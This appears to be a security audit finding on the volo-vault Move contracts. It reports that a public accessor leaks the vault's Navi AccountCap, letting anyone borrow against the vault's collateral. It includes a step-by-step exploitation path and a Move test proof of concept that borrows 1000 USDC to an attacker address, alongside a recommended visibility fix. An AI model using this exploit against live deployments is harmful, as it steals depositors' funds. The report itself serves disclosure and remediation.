# Audit Report

## Title
Unauthorized Borrowing via Public AccountCap Reference Exposure

## Summary
The vault's `get_defi_asset()` function publicly exposes NaviAccountCap references without authorization checks, enabling any attacker to borrow funds from the Navi lending protocol using the vault's credentials. Borrowed funds flow directly to the attacker while debt accumulates on the vault's account, resulting in direct theft of protocol funds.

## Finding Description

This vulnerability represents a critical capability leak where an immutable reference grants more authority than intended. The vault stores NaviAccountCap objects to manage Navi lending positions, but exposes them through a public accessor function that performs no authorization checks.

**Component 1: Public AccountCap Exposure**

The vault's `get_defi_asset` function is declared as `public` and returns an immutable reference to any DeFi asset without authorization checks: [1](#0-0) 

This function is used by adaptors to read AccountCap data for valuation: [2](#0-1) 

**Component 2: Public Borrow Function Without Caller Verification**

The Navi protocol's `incentive_v3::borrow_with_account_cap` is declared as `public` and accepts an immutable `&AccountCap` parameter: [3](#0-2) 

This function extracts the owner address from the AccountCap to record debt, but performs no verification that the caller is authorized: [4](#0-3) 

**Component 3: Funds Flow to Caller**

The underlying `base_borrow` function records debt against the AccountCap's owner but returns borrowed funds as a `Balance<CoinType>` to the caller: [5](#0-4) 

The `pool::withdraw_balance` function splits balance from the pool and returns it to the caller, using the `user` parameter only for event logging: [6](#0-5) 

**Component 4: AccountCap Owner Assignment**

When an AccountCap is created, its `owner` field is set to the AccountCap object's own address, not the creator's address: [7](#0-6) 

This means the vault's AccountCap represents a lending account where all debt accumulates, regardless of who initiated the borrow operation.

**Exploitation Path:**

1. Attacker calls `vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type)` to obtain `&AccountCap`
2. Attacker calls `incentive_v3::borrow_with_account_cap<USDC>(clock, oracle, storage, pool, asset_id, amount, incentive_v2, incentive_v3, account_cap)` with publicly accessible shared objects
3. The function borrows funds based on the vault's collateral
4. Debt is recorded against the vault's AccountCap owner address
5. Borrowed funds are returned as `Balance<USDC>` to the attacker
6. Attacker converts the balance to a coin and transfers it to themselves

All required parameters (Clock, PriceOracle, Storage, Pool, Incentive objects) are shared objects: [8](#0-7) [9](#0-8) 

## Impact Explanation

**Critical Severity - Direct Fund Theft:**

- Attackers can borrow the full amount of liquidity available in the Navi lending pool, limited only by the vault's collateral and health factor constraints
- The borrowed funds are transferred directly to the attacker as a `Balance` object that they can freely convert and transfer
- The vault's lending account accumulates debt equal to the borrowed amount plus accruing interest
- This debt must be repaid by the vault using depositor funds, creating direct loss for all vault participants

**Vault Insolvency Risk:**

- If unauthorized debt exceeds the vault's deposited collateral, the vault's position becomes liquidatable in the Navi protocol
- The vault's loss tolerance mechanisms cannot prevent this attack as the debt is incurred through direct external protocol calls that bypass the vault's operation framework
- Repeated attacks can drain all available liquidity from the lending pool while imposing maximum debt on the vault

**No Viable Defense:**

The health factor check in the borrow logic only validates the vault has sufficient collateral, not that the caller is authorized: [10](#0-9) 

The vault's operation framework controls are completely bypassed since the attack uses direct external protocol calls.

## Likelihood Explanation

**Very High - Trivial to Execute:**

- Any address can call the required public functions without special capabilities or owned assets
- The attack requires only 2 function calls with publicly accessible shared objects
- Asset type strings are predictable and deterministic (e.g., `vault_utils::parse_key<NaviAccountCap>(0)`)
- No timing constraints, race conditions, or complex setup required

**Zero Cost with Direct Profit:**

- The attacker incurs only standard gas fees (minimal cost)
- Direct profit equals the full borrowed amount
- No risk to the attacker as all debt is assigned to the vault
- The attack is repeatable until lending pool liquidity is exhausted or vault becomes liquidatable

**Normal Preconditions:**

- The vulnerability is exploitable whenever the vault has Navi integration enabled (standard operational configuration)
- The vault must have deposited collateral in Navi as part of normal yield strategy operations, as demonstrated in operation tests: [11](#0-10) 

## Recommendation

**Immediate Mitigation:**

1. Change `get_defi_asset` visibility from `public` to `public(package)` to restrict access to only vault package modules
2. Implement authorization checks in `get_defi_asset` that verify the caller has appropriate operator capabilities

**Recommended Fix:**

```move
// Change from:
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType

// To:
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType
```

**Long-term Solution:**

Consider redesigning the AccountCap usage pattern to use mutable borrows during operations only, preventing any external access to capability references. The distinction between `borrow_defi_asset` (removes asset) and `get_defi_asset` (returns reference) should be enforced at the type system level.

## Proof of Concept

```move
#[test]
fun test_unauthorized_borrow_via_accountcap_leak() {
    let mut s = test_scenario::begin(ATTACKER);
    
    // Setup: Vault with NaviAccountCap and collateral (normal state)
    init_vault_with_navi_collateral(&mut s);
    
    s.next_tx(ATTACKER);
    {
        let vault = s.take_shared<Vault<SUI>>();
        let mut storage = s.take_shared<Storage>();
        let mut pool = s.take_shared<Pool<USDC>>();
        let clock = s.take_shared<Clock>();
        let oracle = s.take_shared<PriceOracle>();
        let mut incentive_v2 = s.take_shared<IncentiveV2>();
        let mut incentive_v3 = s.take_shared<IncentiveV3>();
        
        // Step 1: Attacker obtains AccountCap reference via public function
        let account_cap = vault.get_defi_asset<SUI, NaviAccountCap>(
            string::utf8(b"NaviAccountCap:0")
        );
        
        // Step 2: Attacker borrows funds using vault's AccountCap
        let stolen_balance = incentive_v3::borrow_with_account_cap<USDC>(
            &clock,
            &oracle,
            &mut storage,
            &mut pool,
            USDC_ASSET_ID,
            1_000_000_000, // 1000 USDC
            &mut incentive_v2,
            &mut incentive_v3,
            account_cap // Using vault's AccountCap
        );
        
        // Step 3: Attacker converts and transfers stolen funds
        let stolen_coin = coin::from_balance(stolen_balance, s.ctx());
        transfer::public_transfer(stolen_coin, ATTACKER);
        
        // Result: Attacker receives 1000 USDC, vault's account has 1000 USDC debt
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(oracle);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
    };
    
    test_scenario::end(s);
}
```

### Citations

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L20-22)
```text
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    let usd_value = calculate_navi_position_value(
        account_cap.account_owner(),
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-933)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L934-940)
```text
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L266-289)
```text
    fun base_borrow<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        user: address,
    ): Balance<CoinType> {
        storage::when_not_paused(storage);
        storage::version_verification(storage);

        let normal_borrow_amount = pool::normal_amount(pool, amount);
        logic::execute_borrow<CoinType>(clock, oracle, storage, asset, user, (normal_borrow_amount as u256));

        let _balance = pool::withdraw_balance(pool, amount, user);
        emit(BorrowEvent {
            reserve: asset,
            sender: user,
            amount: amount
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/pool.move (L75-82)
```text
    public(friend) fun create_pool<CoinType>(_: &PoolAdminCap, decimal: u8, ctx: &mut TxContext) {
        let pool = Pool<CoinType> {
            id: object::new(ctx),
            balance: balance::zero<CoinType>(),
            treasury_balance: balance::zero<CoinType>(),
            decimal: decimal,
        };
        transfer::share_object(pool);
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/pool.move (L125-140)
```text
    public(friend) fun withdraw_balance<CoinType>(pool: &mut Pool<CoinType>, amount: u64, user: address): Balance<CoinType> {
        if (amount == 0) {
            let _zero = balance::zero<CoinType>();
            return _zero
        };

        let _balance = balance::split(&mut pool.balance, amount);
        emit(PoolWithdraw {
            sender: user,
            recipient: user,
            amount: amount,
            pool: type_name::into_string(type_name::get<CoinType>()),
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L13-17)
```text
    public(friend) fun create_account_cap(ctx: &mut TxContext): AccountCap {
        let id = object::new(ctx);
        let owner = object::uid_to_address(&id);
        AccountCap { id, owner}
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/storage.move (L126-139)
```text
    fun init(ctx: &mut TxContext) {
        transfer::public_transfer(StorageAdminCap {id: object::new(ctx)}, tx_context::sender(ctx));
        transfer::public_transfer(OwnerCap {id: object::new(ctx)}, tx_context::sender(ctx));

        transfer::share_object(Storage {
            id: object::new(ctx),
            version: version::this_version(),
            paused: false,
            reserves: table::new<u8, ReserveData>(ctx),
            reserves_count: 0,
            users: vector::empty<address>(),
            user_info: table::new<address, UserInfo>(ctx),
        })
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/logic.move (L148-156)
```text
        // Checking user health factors //
        //////////////////////////////////
        let avg_ltv = calculate_avg_ltv(clock, oracle, storage, user);
        let avg_threshold = calculate_avg_threshold(clock, oracle, storage, user);
        assert!(avg_ltv > 0 && avg_threshold > 0, error::ltv_is_not_enough());
        let health_factor_in_borrow = ray_math::ray_div(avg_threshold, avg_ltv);
        let health_factor = user_health_factor(clock, storage, oracle, user);
        assert!(health_factor >= health_factor_in_borrow, error::user_is_unhealthy());

```

**File:** volo-vault/tests/operation/operation.test.move (L52-56)
```text
        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(
            0,
            navi_account_cap,
        );
```
